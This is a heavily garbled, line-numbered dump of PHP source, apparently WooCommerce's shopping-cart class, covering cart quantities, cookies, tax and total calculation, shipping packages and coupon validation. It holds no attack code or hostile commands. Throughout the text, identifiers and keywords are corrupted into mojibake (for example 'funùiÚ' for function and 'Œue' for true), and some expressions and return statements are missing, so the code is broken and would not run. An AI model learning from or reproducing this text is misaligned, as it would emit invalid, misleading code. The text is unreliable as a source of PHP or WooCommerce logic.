881 'v¬ŸtiÚ' => 
$v¬ŸtiÚ
,

882 'quªt™y' => 
$quªt™y
,

883 'd©a' => 
$´oduù_d©a


884 è), 
$ÿ¹_™em_key
 );

888 
	`do_aùiÚ
Ğ'woocomm”û_add_to_ÿ¹', 
$ÿ¹_™em_key
, 
$´oduù_id
, 
$quªt™y
, 
$v¬ŸtiÚ_id
, 
$v¬ŸtiÚ
, 
$ÿ¹_™em_d©a
 );

890 
$this
->
	`£t_ÿ¹_cook›s
();

891 
$this
->
	`ÿlcuÏ‹_tÙ®s
();

893  
Œue
;

894 
	}
}

903 
public
 
funùiÚ
 
	$£t_quªt™y
Ğ
$ÿ¹_™em_key
, 
$quªt™y
 = 1, 
$»äesh_tÙ®s
 = 
Œue
 ) {

905 iàĞ
$quªt™y
 == 0 || $quantity < 0 ) {

906 
	`do_aùiÚ
Ğ'woocomm”û_befÜe_ÿ¹_™em_quªt™y_z”o', 
$ÿ¹_™em_key
 );

907 
	`un£t
Ğ
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ] );

909 
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ]['quªt™y'] = 
$quªt™y
;

910 
	`do_aùiÚ
Ğ'woocomm”û_aá”_ÿ¹_™em_quªt™y_upd©e', 
$ÿ¹_™em_key
, 
$quªt™y
 );

913 iàĞ
$»äesh_tÙ®s
 )

914 
$this
->
	`ÿlcuÏ‹_tÙ®s
();

915 
	}
}

924 
´iv©e
 
funùiÚ
 
	$£t_ÿ¹_cook›s
Ğ
$£t
 = 
Œue
 ) {

925 iàĞ
$£t
 ) {

926 
	`wc_£tcook›
( 'woocommerce_items_in_cart', 1 );

927 
	`wc_£tcook›
Ğ'woocomm”û_ÿ¹_hash', 
	`md5
Ğ
	`jsÚ_’code
Ğ
$this
->
	`g‘_ÿ¹
() ) ) );

928 } 
	`–£if
 ( 
	`is£t
Ğ
$_COOKIE
['woocommerce_items_in_cart'] ) ) {

929 
	`wc_£tcook›
Ğ'woocomm”û_™ems_š_ÿ¹', 0, 
	`time
() - 3600 );

930 
	`wc_£tcook›
Ğ'woocomm”û_ÿ¹_hash', '', 
	`time
() - 3600 );

933 
	`do_aùiÚ
Ğ'woocomm”û_£t_ÿ¹_cook›s', 
$£t
 );

934 
	}
}

946 
´iv©e
 
funùiÚ
 
	$»£t
() {

947 
	`fÜ—ch
 ( 
$this
->
ÿ¹_£ssiÚ_d©a
 
as
 
$key
 => 
$deçuÉ
 ) {

948 
$this
->
$key
 = 
$deçuÉ
;

949 
	`un£t
Ğ
	`WC
()->
£ssiÚ
->
$key
 );

951 
	}
}

958 
public
 
funùiÚ
 
	$ÿlcuÏ‹_tÙ®s
() {

960 
$this
->
	`»£t
();

962 
	`do_aùiÚ
Ğ'woocomm”û_befÜe_ÿlcuÏ‹_tÙ®s', 
$this
 );

964 iàĞĞ
$this
->
	`g‘_ÿ¹
() ) == 0 ) {

965 
$this
->
	`£t_£ssiÚ
();

969 
$x_¿‹s
 = 
	`¬¿y
();

970 
$shİ_x_¿‹s
 = 
	`¬¿y
();

975 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

977 
$_´oduù
 = 
$v®ues
['data'];

980 
$this
->
ÿ¹_cÚ‹Ás_weight
 +ğ
$_´oduù
->
	`g‘_weight
(è* 
$v®ues
['quantity'];

981 
$this
->
ÿ¹_cÚ‹Ás_couÁ
 +ğ
$v®ues
['quantity'];

984 
$ba£_´iû
 = 
$_´oduù
->
	`g‘_´iû
();

985 
$lše_´iû
 = 
$_´oduù
->
	`g‘_´iû
(è* 
$v®ues
['quantity'];

987 
$lše_subtÙ®
 = 0;

988 
$lše_subtÙ®_x
 = 0;

993 iàĞ! 
$_´oduù
->
	`is_xabË
() ) {

996 
$this
->
subtÙ®
 +ğ
$lše_´iû
;

997 
$this
->
subtÙ®_ex_x
 +ğ
$lše_´iû
;

1011 } 
	`–£if
 ( 
$this
->
´iûs_šşude_x
 ) {

1014 iàĞ
	`em±y
Ğ
$shİ_x_¿‹s
[ 
$_´oduù
->
x_şass
 ] ) )

1015 
$shİ_x_¿‹s
[ 
$_´oduù
->
x_şass
 ] = 
$this
->
x
->
	`g‘_shİ_ba£_¿‹
( $_product->tax_class );

1018 iàĞ
	`em±y
Ğ
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
() ] ) )

1019 
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
(è] = 
$this
->
x
->
	`g‘_¿‹s
( $_product->get_tax_class() );

1021 
$ba£_x_¿‹s
 = 
$shİ_x_¿‹s
[ 
$_´oduù
->
x_şass
 ];

1022 
$™em_x_¿‹s
 = 
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
() ];

1027 iàĞ
$™em_x_¿‹s
 !=ğ
$ba£_x_¿‹s
 ) {

1030 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_´iû
, 
$ba£_x_¿‹s
, 
Œue
,rue );

1033 
$lše_subtÙ®
 = 
$lše_´iû
 - 
	`¬¿y_sum
Ğ
$xes
 );

1036 
$x_»suÉ
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_subtÙ®
, 
$™em_x_¿‹s
 );

1037 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$x_»suÉ
 );

1045 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_´iû
, 
$™em_x_¿‹s
, 
Œue
 );

1046 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$xes
 );

1047 
$lše_subtÙ®
 = 
$lše_´iû
 - 
	`¬¿y_sum
Ğ
$xes
 );

1058 iàĞ
	`em±y
Ğ
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
() ] ) )

1059 
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
(è] = 
$this
->
x
->
	`g‘_¿‹s
( $_product->get_tax_class() );

1061 
$™em_x_¿‹s
 = 
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
() ];

1064 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_´iû
, 
$™em_x_¿‹s
 );

1065 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$xes
 );

1066 
$lše_subtÙ®
 = 
$lše_´iû
;

1070 
$this
->
subtÙ®
 +ğ
$lše_subtÙ®
 + 
$lše_subtÙ®_x
;

1071 
$this
->
subtÙ®_ex_x
 +ğ
$lše_subtÙ®
;

1077 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

1079 
$_´oduù
 = 
$v®ues
['data'];

1082 
$ba£_´iû
 = 
$_´oduù
->
	`g‘_´iû
();

1083 
$lše_´iû
 = 
$_´oduù
->
	`g‘_´iû
(è* 
$v®ues
['quantity'];

1088 iàĞ! 
$_´oduù
->
	`is_xabË
() ) {

1091 
$discouÁed_´iû
 = 
$this
->
	`g‘_discouÁed_´iû
Ğ
$v®ues
, 
$ba£_´iû
, 
Œue
 );

1092 
$discouÁed_x_amouÁ
 = 0;

1093 
$x_amouÁ
 = 0;

1094 
$lše_subtÙ®_x
 = 0;

1095 
$lše_subtÙ®
 = 
$lše_´iû
;

1096 
$lše_x
 = 0;

1097 
$lše_tÙ®
 = 
$this
->
x
->
	`round
Ğ
$discouÁed_´iû
 * 
$v®ues
['quantity'] );

1102 } 
	`–£if
 ( 
$this
->
´iûs_šşude_x
 ) {

1104 
$ba£_x_¿‹s
 = 
$shİ_x_¿‹s
[ 
$_´oduù
->
x_şass
 ];

1105 
$™em_x_¿‹s
 = 
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
() ];

1110 iàĞ
$™em_x_¿‹s
 !=ğ
$ba£_x_¿‹s
 ) {

1113 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_´iû
, 
$ba£_x_¿‹s
, 
Œue
,rue );

1116 
$lše_subtÙ®
 = 
	`round
Ğ
$lše_´iû
 - 
	`¬¿y_sum
Ğ
$xes
 ), 
WC_ROUNDING_PRECISION
 );

1119 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_subtÙ®
, 
$™em_x_¿‹s
 );

1120 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$xes
 );

1123 
$adju¡ed_´iû
 = ( 
$lše_subtÙ®
 + 
$lše_subtÙ®_x
 ) / 
$v®ues
['quantity'];

1126 
$discouÁed_´iû
 = 
$this
->
	`g‘_discouÁed_´iû
Ğ
$v®ues
, 
$adju¡ed_´iû
, 
Œue
 );

1127 
$discouÁed_xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$discouÁed_´iû
 * 
$v®ues
['quªt™y'], 
$™em_x_¿‹s
, 
Œue
 );

1128 
$lše_x
 = 
	`¬¿y_sum
Ğ
$discouÁed_xes
 );

1129 
$lše_tÙ®
 = ( 
$discouÁed_´iû
 * 
$v®ues
['quªt™y'] ) - 
$lše_x
;

1137 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_´iû
, 
$™em_x_¿‹s
, 
Œue
 );

1140 
$lše_subtÙ®
 = 
$lše_´iû
 - 
	`¬¿y_sum
Ğ
$xes
 );

1141 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$xes
 );

1144 
$discouÁed_´iû
 = 
$this
->
	`g‘_discouÁed_´iû
Ğ
$v®ues
, 
$ba£_´iû
, 
Œue
 );

1145 
$discouÁed_xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$discouÁed_´iû
 * 
$v®ues
['quªt™y'], 
$™em_x_¿‹s
, 
Œue
 );

1146 
$lše_x
 = 
	`¬¿y_sum
Ğ
$discouÁed_xes
 );

1147 
$lše_tÙ®
 = ( 
$discouÁed_´iû
 * 
$v®ues
['quªt™y'] ) - 
$lše_x
;

1151 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$this
->
xes
 + 
$discouÁed_xes
 ) 
as
 
$key
 ) {

1152 
$this
->
xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$discouÁed_xes
[ $key ] ) ? $discounted_taxes[ $key ] : 0 ) + ( isset( $this->taxes[ $key ] ) ? $this->taxes[ $key ] : 0 );

1160 
$™em_x_¿‹s
 = 
$x_¿‹s
[ 
$_´oduù
->
	`g‘_x_şass
() ];

1163 
$xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$lše_´iû
, 
$™em_x_¿‹s
 );

1166 
$lše_subtÙ®
 = 
$lše_´iû
;

1167 
$lše_subtÙ®_x
 = 
	`¬¿y_sum
Ğ
$xes
 );

1170 
$discouÁed_´iû
 = 
$this
->
	`g‘_discouÁed_´iû
Ğ
$v®ues
, 
$ba£_´iû
, 
Œue
 );

1171 
$discouÁed_xes
 = 
$this
->
x
->
	`ÿlc_x
Ğ
$discouÁed_´iû
 * 
$v®ues
['quªt™y'], 
$™em_x_¿‹s
 );

1172 
$discouÁed_x_amouÁ
 = 
	`¬¿y_sum
Ğ
$discouÁed_xes
 );

1173 
$lše_x
 = 
$discouÁed_x_amouÁ
;

1174 
$lše_tÙ®
 = 
$discouÁed_´iû
 * 
$v®ues
['quantity'];

1177 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$this
->
xes
 + 
$discouÁed_xes
 ) 
as
 
$key
 ) {

1178 
$this
->
xes
[ 
$key
 ] = ( 
	`is£t
Ğ
$discouÁed_xes
[ $key ] ) ? $discounted_taxes[ $key ] : 0 ) + ( isset( $this->taxes[ $key ] ) ? $this->taxes[ $key ] : 0 );

1183 
$this
->
	`­¶y_´oduù_discouÁs_aá”_x
Ğ
$v®ues
, 
$lše_tÙ®
 + 
$lše_x
 );

1186 
$this
->
ÿ¹_cÚ‹Ás_tÙ®
 +ğ
$lše_tÙ®
;

1189 
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ]['lše_tÙ®'] = 
$lše_tÙ®
;

1190 
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ]['lše_x'] = 
$lše_x
;

1191 
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ]['lše_subtÙ®'] = 
$lše_subtÙ®
;

1192 
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ]['lše_subtÙ®_x'] = 
$lše_subtÙ®_x
;

1196 iàĞ
	`is_checkout
(è|| 
	`is_ÿ¹
(è|| 
	`defšed
('WOOCOMMERCE_CHECKOUT') || defined('WOOCOMMERCE_CART') ) {

1199 
$this
->
	`ÿlcuÏ‹_shpšg
();

1202 
$this
->
	`ÿlcuÏ‹_ães
();

1205 iàĞ
$this
->
round_©_subtÙ®
 ) {

1206 
$this
->
x_tÙ®
 = $this->
x
->
	`g‘_x_tÙ®
Ğ$this->
xes
 );

1207 
$this
->
shpšg_x_tÙ®
 = $this->
x
->
	`g‘_x_tÙ®
Ğ$this->
shpšg_xes
 );

1208 
$this
->
xes
 = 
	`¬¿y_m­
Ğ
	`¬¿y
Ğ$this->
x
, 'round' ), $this->taxes );

1209 
$this
->
shpšg_xes
 = 
	`¬¿y_m­
Ğ
	`¬¿y
Ğ$this->
x
, 'round' ), $this->shipping_taxes );

1211 
$this
->
x_tÙ®
 = 
	`¬¿y_sum
Ğ$this->
xes
 );

1212 
$this
->
shpšg_x_tÙ®
 = 
	`¬¿y_sum
Ğ$this->
shpšg_xes
 );

1216 iàĞ
	`WC
()->
cu¡om”
->
	`is_v©_exem±
() ) {

1217 
$this
->
	`»move_xes
();

1221 
$this
->
	`­¶y_ÿ¹_discouÁs_aá”_x
();

1224 
	`do_aùiÚ
Ğ'woocomm”û_ÿlcuÏ‹_tÙ®s', 
$this
 );

1227 
$this
->
tÙ®
 = 
	`max
Ğ0, 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿlcuÏ‹d_tÙ®', 
	`round
Ğ$this->
ÿ¹_cÚ‹Ás_tÙ®
 + $this->
x_tÙ®
 + $this->
shpšg_x_tÙ®
 + $this->
shpšg_tÙ®
 - $this->
discouÁ_tÙ®
 + $this->
ãe_tÙ®
, $this->
dp
 ), $this ) );

1232 
$this
->
x_tÙ®
 = $this->
x
->
	`g‘_x_tÙ®
Ğ$this->
xes
 );

1235 iàĞ
	`WC
()->
cu¡om”
->
	`is_v©_exem±
() ) {

1236 
$this
->
	`»move_xes
();

1240 
$this
->
	`­¶y_ÿ¹_discouÁs_aá”_x
();

1243 
$this
->
	`£t_£ssiÚ
();

1244 
	}
}

1252 
public
 
funùiÚ
 
	$»move_xes
() {

1253 
$this
->
shpšg_x_tÙ®
 = $this->
x_tÙ®
 = 0;

1254 
$this
->
subtÙ®
 = $this->
subtÙ®_ex_x
;

1256 
	`fÜ—ch
 ( 
$this
->
ÿ¹_cÚ‹Ás
 
as
 
$ÿ¹_™em_key
 => 
$™em
 ) {

1257 
$this
->
ÿ¹_cÚ‹Ás
[ 
$ÿ¹_™em_key
 ]['line_subtotal_tax'] = $this->cart_contents[ $cart_item_key ]['line_tax'] = 0;

1261 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_»move_xes_­¶y_z”o_¿‹', 
Œue
 ) ) {

1262 
$this
->
xes
 = $this->
shpšg_xes
 = 
	`¬¿y
Ğ
	`­¶y_f‹rs
( 'woocommerce_cart_remove_taxes_zero_rate_id', 'zero-rated' ) => 0 );

1264 
$this
->
xes
 = $this->
shpšg_xes
 = 
	`¬¿y
();

1266 
	}
}

1273 
public
 
funùiÚ
 
	$Ãeds_·ym’t
() {

1274  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_Ãeds_·ym’t', 
$this
->
tÙ®
 > 0, $this );

1275 
	}
}

1287 
public
 
funùiÚ
 
	$ÿlcuÏ‹_shpšg
() {

1288 iàĞ
$this
->
	`Ãeds_shpšg
(è&& $this->
	`show_shpšg
() ) {

1289 
	`WC
()->
shpšg
->
	`ÿlcuÏ‹_shpšg
Ğ
$this
->
	`g‘_shpšg_·ckages
() );

1291 
	`WC
()->
shpšg
->
	`»£t_shpšg
();

1295 
$this
->
shpšg_tÙ®
 = 
	`WC
()->
shpšg
->shipping_total;

1296 
$this
->
shpšg_xes
 = 
	`WC
()->
shpšg
->shipping_taxes;

1297 
	}
}

1313 
public
 
funùiÚ
 
	$g‘_shpšg_·ckages
() {

1315 
$·ckages
 = 
	`¬¿y
();

1317 
$·ckages
[0]['cÚ‹Ás'] = 
$this
->
	`g‘_ÿ¹
();

1318 
$·ckages
[0]['contents_cost'] = 0;

1319 
$·ckages
[0]['­¶›d_coupÚs'] = 
$this
->
­¶›d_coupÚs
;

1320 
$·ckages
[0]['de¡š©iÚ']['couÁry'] = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
();

1321 
$·ckages
[0]['de¡š©iÚ']['¡©e'] = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_¡©e
();

1322 
$·ckages
[0]['de¡š©iÚ']['po¡code'] = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_po¡code
();

1323 
$·ckages
[0]['de¡š©iÚ']['c™y'] = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_c™y
();

1324 
$·ckages
[0]['de¡š©iÚ']['add»ss'] = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_add»ss
();

1325 
$·ckages
[0]['de¡š©iÚ']['add»ss_2'] = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_add»ss_2
();

1327 
	`fÜ—ch
 ( 
$this
->
	`g‘_ÿ¹
(è
as
 
$™em
 )

1328 iàĞ
$™em
['d©a']->
	`Ãeds_shpšg
() )

1329 iàĞ
	`is£t
Ğ
$™em
['line_total'] ) )

1330 
$·ckages
[0]['cÚ‹Ás_co¡'] +ğ
$™em
['line_total'];

1332  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_shpšg_·ckages', 
$·ckages
 );

1333 
	}
}

1340 
public
 
funùiÚ
 
	$Ãeds_shpšg
() {

1341 iàĞ
	`g‘_İtiÚ
('woocommerce_calc_shipping') == 'no' )

1342  
çl£
;

1344 
$Ãeds_shpšg
 = 
çl£
;

1346 iàĞ
$this
->
ÿ¹_cÚ‹Ás
 ) {

1347 
	`fÜ—ch
 ( 
$this
->
ÿ¹_cÚ‹Ás
 
as
 
$ÿ¹_™em_key
 => 
$v®ues
 ) {

1348 
$_´oduù
 = 
$v®ues
['data'];

1349 iàĞ
$_´oduù
->
	`Ãeds_shpšg
() ) {

1350 
$Ãeds_shpšg
 = 
Œue
;

1355  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_Ãeds_shpšg', 
$Ãeds_shpšg
 );

1356 
	}
}

1363 
funùiÚ
 
	$Ãeds_shpšg_add»ss
() {

1365 
$Ãeds_shpšg_add»ss
 = 
çl£
;

1367 iàĞ
	`WC
()->
ÿ¹
->
	`Ãeds_shpšg
(è==ğ
Œue
 && ! WC()->ÿ¹->
	`sh_to_blšg_add»ss_Úly
() ) {

1368 
$Ãeds_shpšg_add»ss
 = 
Œue
;

1371  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_Ãeds_shpšg_add»ss', 
$Ãeds_shpšg_add»ss
 );

1372 
	}
}

1379 
public
 
funùiÚ
 
	$show_shpšg
() {

1380 iàĞ
	`g‘_İtiÚ
('woocomm”û_ÿlc_shpšg'è=ğ'no' || ! 
	`is_¬¿y
Ğ
$this
->
ÿ¹_cÚ‹Ás
 ) )

1381  
çl£
;

1383 iàĞ
	`g‘_İtiÚ
( 'woocommerce_shipping_cost_requires_address' ) == 'yes' ) {

1384 iàĞ! 
	`WC
()->
cu¡om”
->
	`has_ÿlcuÏ‹d_shpšg
() ) {

1385 iàĞ! 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
(è|| ( ! WC()->cu¡om”->
	`g‘_shpšg_¡©e
(è&& ! WC()->cu¡om”->
	`g‘_shpšg_po¡code
() ) )

1386  
çl£
;

1390 
$show_shpšg
 = 
Œue
;

1392  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_»ady_to_ÿlc_shpšg', 
$show_shpšg
 );

1394 
	}
}

1401 
public
 
funùiÚ
 
	$sh_to_blšg_add»ss_Úly
() {

1402  
	`g‘_İtiÚ
('woocommerce_ship_to_billing_address_only') == 'yes';

1403 
	}
}

1410 
public
 
funùiÚ
 
	$g‘_ÿ¹_shpšg_tÙ®
() {

1411 iàĞ
	`is£t
Ğ
$this
->
shpšg_tÙ®
 ) ) {

1412 iàĞ
$this
->
shpšg_tÙ®
 > 0 ) {

1415 iàĞ
$this
->
x_di¥Ïy_ÿ¹
 == 'excl' ) {

1417 
$»tuº
 = 
	`wc_´iû
Ğ
$this
->
shpšg_tÙ®
 );

1419 iàĞ
$this
->
shpšg_x_tÙ®
 > 0 && $this->
´iûs_šşude_x
 ) {

1420 
$»tuº
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`ex_x_Ü_v©
() . '</small>';

1423  
$»tuº
;

1427 
$»tuº
 = 
	`wc_´iû
Ğ
$this
->
shpšg_tÙ®
 + $this->
shpšg_x_tÙ®
 );

1429 iàĞ
$this
->
shpšg_x_tÙ®
 > 0 && ! $this->
´iûs_šşude_x
 ) {

1430 
$»tuº
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`šc_x_Ü_v©
() . '</small>';

1433  
$»tuº
;

1438  
	`__
( 'Free!', 'woocommerce' );

1443 
	}
}

1459 
public
 
funùiÚ
 
	$check_cu¡om”_coupÚs
Ğ
$po¡ed
 ) {

1460 iàĞ! 
	`em±y
Ğ
$this
->
­¶›d_coupÚs
 ) ) {

1461 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1462 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1464 iàĞ
$coupÚ
->
	`is_v®id
() ) {

1467 iàĞ
	`is_¬¿y
Ğ
$coupÚ
->
cu¡om”_ema
 ) && ( $coupon->customer_email ) > 0 ) {

1468 
$coupÚ
->
cu¡om”_ema
 = 
	`¬¿y_m­
( 'sanitize_email', $coupon->customer_email );

1470 iàĞ
	`is_u£r_logged_š
() ) {

1471 
$cu¼’t_u£r
 = 
	`wp_g‘_cu¼’t_u£r
();

1472 
$check_emas
[] = 
$cu¼’t_u£r
->
u£r_ema
;

1474 
$check_emas
[] = 
$po¡ed
['billing_email'];

1475 
$check_emas
 = 
	`¬¿y_m­
( 'sanitize_email',‡rray_map( 'strtolower', $check_emails ) );

1477 iàĞ0 =ğĞ
	`¬¿y_š‹r£ù
Ğ
$check_emas
, 
$coupÚ
->
cu¡om”_ema
 ) ) ) {

1478 
$coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
E_WC_COUPON_NOT_YOURS_REMOVED
 );

1481 
$this
->
	`»move_coupÚ
Ğ
$code
 );

1484 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'»äesh_tÙ®s', 
Œue
 );

1489 iàĞ
$coupÚ
->
u§ge_lim™_³r_u£r
 > 0 ) {

1490 
$u£d_by
 = (
¬¿y
è
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_used_by' );

1492 iàĞ
	`is_u£r_logged_š
() ) {

1493 
$cu¼’t_u£r
 = 
	`wp_g‘_cu¼’t_u£r
();

1494 
$check_emas
[] = 
$cu¼’t_u£r
->
u£r_ema
;

1496 
$check_emas
[] = 
$po¡ed
['billing_email'];

1497 
$check_emas
 = 
	`¬¿y_m­
( 'sanitize_email',‡rray_map( 'strtolower', $check_emails ) );

1498 
$u§ge_couÁ
 = Ğ
	`¬¿y_keys
Ğ
$u£d_by
, 
	`g‘_cu¼’t_u£r_id
() ) );

1500 
	`fÜ—ch
 ( 
$check_emas
 
as
 
$check_ema
 ) {

1501 
$u§ge_couÁ
 = $u§ge_couÁ + Ğ
	`¬¿y_keys
Ğ
$u£d_by
, 
$check_ema
 ) );

1504 iàĞ
$u§ge_couÁ
 >ğ
$coupÚ
->
u§ge_lim™_³r_u£r
 ) {

1505 
$coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
E_WC_COUPON_USAGE_LIMIT_REACHED
 );

1508 
$this
->
	`»move_coupÚ
Ğ
$code
 );

1511 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'»äesh_tÙ®s', 
Œue
 );

1517 
	}
}

1524 
public
 
funùiÚ
 
	$has_discouÁ
Ğ
$coupÚ_code
 ) {

1525  
	`š_¬¿y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_code', 
$coupÚ_code
 ), 
$this
->
­¶›d_coupÚs
 );

1526 
	}
}

1534 
public
 
funùiÚ
 
	$add_discouÁ
Ğ
$coupÚ_code
 ) {

1536 iàĞ! 
$this
->
	`coupÚs_’abËd
() )

1537  
çl£
;

1540 
$coupÚ_code
 = 
	`­¶y_f‹rs
( 'woocommerce_coupon_code', $coupon_code );

1543 
$the_coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$coupÚ_code
 );

1545 iàĞ
$the_coupÚ
->
id
 ) {

1548 iàĞ! 
$the_coupÚ
->
	`is_v®id
() ) {

1549 
	`wc_add_nÙiû
Ğ
$the_coupÚ
->
	`g‘_”rÜ_mes§ge
(), 'error' );

1550  
çl£
;

1554 iàĞ
$this
->
	`has_discouÁ
Ğ
$coupÚ_code
 ) ) {

1555 
$the_coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
E_WC_COUPON_ALREADY_APPLIED
 );

1556  
çl£
;

1560 iàĞ
$the_coupÚ
->
šdividu®_u£
 == 'yes' ) {

1561 
$this
->
­¶›d_coupÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_­¶y_šdividu®_u£_coupÚ', 
	`¬¿y
(), 
$the_coupÚ
, $this->applied_coupons );

1564 iàĞ
$this
->
­¶›d_coupÚs
 ) {

1565 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1566 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1568 iàĞ
$coupÚ
->
šdividu®_u£
 =ğ'yes' && 
çl£
 ==ğ
	`­¶y_f‹rs
Ğ'woocomm”û_­¶y_w™h_šdividu®_u£_coupÚ', f®£, 
$the_coupÚ
, $coupÚ, 
$this
->
­¶›d_coupÚs
 ) ) {

1571 
$coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
E_WC_COUPON_ALREADY_APPLIED_INDIV_USE_ONLY
 );

1573  
çl£
;

1578 
$this
->
­¶›d_coupÚs
[] = 
$coupÚ_code
;

1581 iàĞ
$the_coupÚ
->
	`’abË_ä“_shpšg
() ) {

1582 
$·ckages
 = 
	`WC
()->
shpšg
->
	`g‘_·ckages
();

1583 
$cho£n_shpšg_m‘hods
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

1585 
	`fÜ—ch
 ( 
$·ckages
 
as
 
$i
 => 
$·ckage
 ) {

1586 
$cho£n_shpšg_m‘hods
[ 
$i
 ] = 'free_shipping';

1589 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_shpšg_m‘hods', 
$cho£n_shpšg_m‘hods
 );

1592 
$this
->
	`ÿlcuÏ‹_tÙ®s
();

1594 
$the_coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
WC_COUPON_SUCCESS
 );

1596 
	`do_aùiÚ
Ğ'woocomm”û_­¶›d_coupÚ', 
$coupÚ_code
 );

1598  
Œue
;

1601 
$the_coupÚ
->
	`add_coupÚ_mes§ge
Ğ
WC_CoupÚ
::
E_WC_COUPON_NOT_EXIST
 );

1602  
çl£
;

1604  
çl£
;

1605 
	}
}

1612 
public
 
funùiÚ
 
	$g‘_coupÚs
Ğ
$ty³
 = 
nuÎ
 ) {

1613 
$coupÚs
 = 
	`¬¿y
();

1615 iàĞ'ÿ¹' =ğ
$ty³
 || 
	`is_nuÎ
( $type ) ) {

1616 iàĞ
$this
->
­¶›d_coupÚs
 ) {

1617 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1618 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1620 iàĞ
$coupÚ
->
	`­¶y_befÜe_x
() )

1621 
$coupÚs
[ 
$code
 ] = 
$coupÚ
;

1626 iàĞ'Üd”' =ğ
$ty³
 || 
	`is_nuÎ
( $type ) ) {

1627 iàĞ
$this
->
­¶›d_coupÚs
 ) {

1628 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1629 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1631 iàĞ! 
$coupÚ
->
	`­¶y_befÜe_x
() )

1632 
$coupÚs
[ 
$code
 ] = 
$coupÚ
;

1637  
$coupÚs
;

1638 
	}
}

1645 
public
 
funùiÚ
 
	$g‘_­¶›d_coupÚs
() {

1646  
$this
->
­¶›d_coupÚs
;

1647 
	}
}

1654 
public
 
funùiÚ
 
	$»move_coupÚs
Ğ
$ty³
 = 
nuÎ
 ) {

1656 iàĞ'ÿ¹' =ğ
$ty³
 || 1 == $type ) {

1657 iàĞ
$this
->
­¶›d_coupÚs
 ) {

1658 
	`fÜ—ch
 ( 
$this
->
­¶›d_coupÚs
 
as
 
$code
 ) {

1659 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1661 iàĞ
